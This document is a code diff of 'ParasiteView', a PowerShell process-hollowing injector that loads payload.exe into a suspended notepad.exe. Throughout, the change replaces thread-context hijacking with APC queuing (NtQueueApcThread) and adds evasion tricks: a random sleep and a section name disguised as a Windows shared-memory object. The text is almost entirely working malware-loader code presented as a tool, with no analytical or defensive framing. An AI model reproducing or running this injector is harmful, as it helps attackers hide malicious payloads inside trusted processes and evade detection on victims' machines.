@@ -60,11 +60,14 @@ public static class NtNative {
         out PROCESS_INFORMATION pi
     );
 
-    [DllImport("kernel32.dll")]
-    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+    [DllImport("ntdll.dll")]
+    public static extern uint NtQueueApcThread(
+        IntPtr ThreadHandle,
+        IntPtr ApcRoutine,
+        IntPtr ApcArgument1,
+        IntPtr ApcArgument2,
+        IntPtr ApcArgument3
+    );
 
     [DllImport("kernel32.dll")]
     public static extern uint ResumeThread(IntPtr hThread);
@@ -95,15 +98,12 @@ public static class NtNative {
 $payloadPath = "payload.exe"
 $targetBinary = "C:\\Windows\\System32\\notepad.exe"
 $secSize = [ulong]0x200000
+$sectionName = "\BaseNamedObjects\Windows_SharedMemory_" + (Get-Random -Minimum 1000 -Maximum 9999)
 
 # VALIDATE PAYLOAD
-if (-not (Test-Path $payloadPath)) {
-    throw "Payload not found: $payloadPath"
-}
+if (-not (Test-Path $payloadPath)) { throw "Payload not found: $payloadPath" }
 $payload = [IO.File]::ReadAllBytes($payloadPath)
-if ($payload.Length -gt $secSize) {
-    throw "Payload too large. Max allowed: $secSize bytes"
-}
+if ($payload.Length -gt $secSize) { throw "Payload too large. Max allowed: $secSize bytes" }
 
 # Parse EntryPoint
 $e_lfanew = [BitConverter]::ToInt32($payload, 0x3C)
@@ -111,25 +111,33 @@ $entryOffset = $e_lfanew + 0x28
 $entryPoint = [BitConverter]::ToInt32($payload, $entryOffset)
 Write-Host "[*] EntryPoint offset in payload.exe: 0x$("{0:X}" -f $entryPoint)"
 
-# 1. Create pagefile-backed section
-[int]$status = [NtNative]::NtCreateSection([ref]$hSection, 0xF001F, [IntPtr]::Zero, [ref]$secSize, 0x04, 0x8000000, [IntPtr]::Zero)
-if ($status -ne 0) { throw "NtCreateSection failed: 0x{0:X}" -f $status }
+# 1. Create named section
+$unicodeName = [System.Text.Encoding]::Unicode.GetBytes($sectionName + "`0")
+$ptrName = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($unicodeName.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($unicodeName, 0, $ptrName, $unicodeName.Length)
+
+$objectAttributes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)
+[System.Runtime.InteropServices.Marshal]::WriteInt32($objectAttributes, 0, 24)  # Length
+[System.Runtime.InteropServices.Marshal]::WriteIntPtr($objectAttributes, 8, $ptrName)  # Name
+
+[int]$status = [NtNative]::NtCreateSection([ref]$hSection, 0xF001F, $objectAttributes, [ref]$secSize, 0x04, 0x8000000, [IntPtr]::Zero)
+if ($status -ne 0) { throw "NtCreateSection failed: 0x$("{0:X}" -f $status)" }
 
 # 2. Map into local process
 $localBase = [IntPtr]::Zero
 $viewSize = $secSize
 $status = [NtNative]::NtMapViewOfSection($hSection, (Get-Process -id $PID).Handle, [ref]$localBase, [UIntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 2, 0, 0x04)
-if ($status -ne 0) { throw "NtMapView (self) failed: 0x{0:X}" -f $status }
+if ($status -ne 0) { throw "NtMapView (self) failed: 0x$("{0:X}" -f $status)" }
 [System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $localBase, $payload.Length)
 
-# 3. Launch target binary suspended
+# 3. Launch target suspended
 $si = New-Object NtNative+STARTUPINFOEX
 $pi = New-Object NtNative+PROCESS_INFORMATION
 if (-not [NtNative]::CreateProcess($targetBinary, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)) {
-    throw "CreateProcess failed: $(GetLastError())"
+    throw "CreateProcess failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
 }
 
-# 4. Get BaseAddress from context (Rdx = ImageBaseAddress)
+# 4. Get ImageBase from context (Rdx)
 $ctx = New-Object CONTEXT64
 $ctx.ContextFlags = 0x100010
 [NtNative]::GetThreadContext($pi.hThread, [ref]$ctx)
@@ -137,22 +145,29 @@ $imgBase = [IntPtr]::new([Int64]$ctx.Rdx)
 
 # 5. Unmap original image
 $status = [NtNative]::NtUnmapViewOfSection($pi.hProcess, $imgBase)
-if ($status -ne 0) { throw "NtUnmapViewOfSection failed: 0x{0:X}" -f $status }
+if ($status -ne 0) { throw "NtUnmapViewOfSection failed: 0x$("{0:X}" -f $status)" }
 
-# 6. Map payload into remote process
+# 6. Random delay (3-10s)
+$delay = Get-Random -Minimum 3000 -Maximum 10000
+Write-Host "[*] Random delay: $($delay/1000) seconds"
+Start-Sleep -Milliseconds $delay
+
+# 7. Map into remote process
 $remoteBase = $imgBase
 $viewSize = $secSize
 $status = [NtNative]::NtMapViewOfSection($hSection, $pi.hProcess, [ref]$remoteBase, [UIntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 2, 0, 0x20)
-if ($status -ne 0) { throw "NtMapView (remote) failed: 0x{0:X}" -f $status }
+if ($status -ne 0) { throw "NtMapView (remote) failed: 0x$("{0:X}" -f $status)" }
 
-# 7. Patch RIP to payload entrypoint
-$ctx.ContextFlags = 0x100010
-[NtNative]::GetThreadContext($pi.hThread, [ref]$ctx)
-$ctx.Rip = [UInt64]$remoteBase + $entryPoint
-[NtNative]::SetThreadContext($pi.hThread, [ref]$ctx)
-Write-Host "[*] RIP set to: 0x$("{0:X}" -f $ctx.Rip)"
+# 8. Queue APC to payload entrypoint
+$apcRoutine = [IntPtr]::new([Int64]($remoteBase.ToInt64() + $entryPoint))
+$status = [NtNative]::NtQueueApcThread($pi.hThread, $apcRoutine, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+if ($status -ne 0) { throw "NtQueueApcThread failed: 0x$("{0:X}" -f $status)" }
+Write-Host "[*] APC queued to: 0x$("{0:X}" -f $apcRoutine.ToInt64())"
 
-# 8. Resume thread
+# 9. Resume thread
 [NtNative]::ResumeThread($pi.hThread) | Out-Null
-Write-Host "[+] ParasiteView: Payload ejecutado desde sección pagefile-backed en proceso $($pi.dwProcessId)"
+Write-Host "[+] ParasiteView: Payload ejecutado via APC en proceso $($pi.dwProcessId)"
 
+# Cleanup
+[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptrName)
+[System.Runtime.InteropServices.Marshal]::FreeHGlobal($objectAttributes)
